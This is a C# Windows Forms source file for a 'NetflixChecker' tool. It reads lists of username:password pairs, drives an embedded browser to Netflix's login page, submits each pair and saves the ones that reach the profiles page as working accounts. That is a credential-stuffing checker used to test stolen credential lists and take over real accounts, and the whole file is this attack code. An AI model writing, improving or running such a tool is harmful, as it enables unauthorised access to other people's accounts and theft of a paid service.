using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;


namespace NetflixChecker
{
    public partial class Form1 : Form
    {
        bool keepGoing;
        string publicsave;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void scanner_Click(object sender, EventArgs e)
        {
            keepGoing = true;
            int accounts = textBox1.Lines.Length;
            try
            {
                    foreach (string st in textBox1.Lines)
                    {
                        webBrowser1.Navigate("https://www.netflix.com/globallogin");
                        if (string.IsNullOrEmpty(st)) continue;
                        else if (st.Contains('-')) continue;
                        else if (!keepGoing) break;
                        publicsave = st;
                        int location = st.IndexOf(':');
                        string username = st.Substring(0, location);
                        string password = st.Substring(location, st.Length - (location));
                        password = password.Replace(':', ' ');
                        password.Trim();
                        login(username, password);
                    }
                }
            catch (Exception ee)
            {
                MessageBox.Show(ee.Message);
            }
        }
        private void adder_Click(object sender, EventArgs e)
        {
            string path = string.Empty;
            string[] accounts;
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.ShowDialog();
            path = ofd.FileName;
            accounts = File.ReadAllLines(path);
            textBox1.Text = string.Empty;
            foreach (string account in accounts)
            {
                textBox1.Text += "\n" + account;
            }
            adder.Enabled = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            adder.Enabled = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            keepGoing = false;
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }
        private void login(string username, string password)
        {
                var emailField = webBrowser1.Document.GetElementById("email");
                var passField = webBrowser1.Document.GetElementById("password");
                var button = webBrowser1.Document.GetElementById("login-form-contBtn");
                emailField.SetAttribute("value", username);
                passField.SetAttribute("value", password);
                button.InvokeMember("click");
                string newURL = webBrowser1.Url.ToString();
                MessageBox.Show(newURL);
                if (newURL.Contains("ProfilesGate"))
                {
                    MessageBox.Show("Account is working!");
                    textBox2.Text += Environment.NewLine + publicsave;
                }
                else
                {
                    MessageBox.Show("doesnt work");
                }
                webBrowser1.Navigate("https://www.netflix.com/logout");
        }
        }
    }
